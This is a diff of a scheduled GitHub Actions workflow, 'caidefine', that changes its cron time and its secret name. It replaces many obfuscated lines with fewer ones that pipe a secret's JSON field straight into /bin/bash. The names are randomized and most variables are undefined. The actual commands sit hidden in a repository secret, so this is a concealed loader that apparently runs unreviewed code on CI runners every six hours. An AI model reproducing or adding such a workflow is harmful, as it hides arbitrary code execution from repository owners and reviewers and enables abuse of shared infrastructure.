@@ -3,33 +3,23 @@ name: caidefine
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 0/6 * * *'
+    - cron: '39 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: caidefine
         env:
-          rvj625: ${{ secrets.rvj625 }}
+          oeri26: ${{ secrets.oeri26 }}
         run: |
-          echo $rvj625 | jq -r .g14 | /bin/bash
-          echo $w174 | jq -r .ejj44144 | /bin/bash
-          echo $qx5 | jq -r .gbgk1426 | /bin/bash
-          echo $qkssz6 | jq -r .bhex491 | /bin/bash
-          echo $jfhm01 | jq -r .gjrl4612 | /bin/bash
-          echo $c5 | jq -r .zymih03 | /bin/bash
-          echo $s1 | jq -r .wwv9436 | /bin/bash
-          echo $tcsw03 | jq -r .padxy265 | /bin/bash
-          echo $qqlcb9 | jq -r .fenw482 | /bin/bash
-          echo $zd23438 | jq -r .ofxe529 | /bin/bash
-          echo $kttd6482 | jq -r .nxfwq9952 | /bin/bash
-          echo $ilw15 | jq -r .lke92 | /bin/bash
-          echo $sfsc408 | jq -r .bxynf23 | /bin/bash
-          echo $ruuy45 | jq -r .mgzci08 | /bin/bash
-          echo $rkf53 | jq -r .t4 | /bin/bash
-          echo $vhmqu206 | jq -r .voqwy709 | /bin/bash
-          echo $z63 | jq -r .tln29 | /bin/bash
+          echo $oeri26 | jq -r .ap68 | /bin/bash
+          echo $kahl95144 | jq -r .khoi22576 | /bin/bash
+          echo $lcdpu1888 | jq -r .p9056 | /bin/bash
+          echo $dvb6170 | jq -r .lwnbw761 | /bin/bash
+          echo $jk11254 | jq -r .hbe2246 | /bin/bash
+          echo $qhg12 | jq -r .yur22493 | /bin/bash
+          echo $hc2848 | jq -r .drc0056 | /bin/bash
+          echo $gxib0763 | jq -r .iu8774 | /bin/bash
 
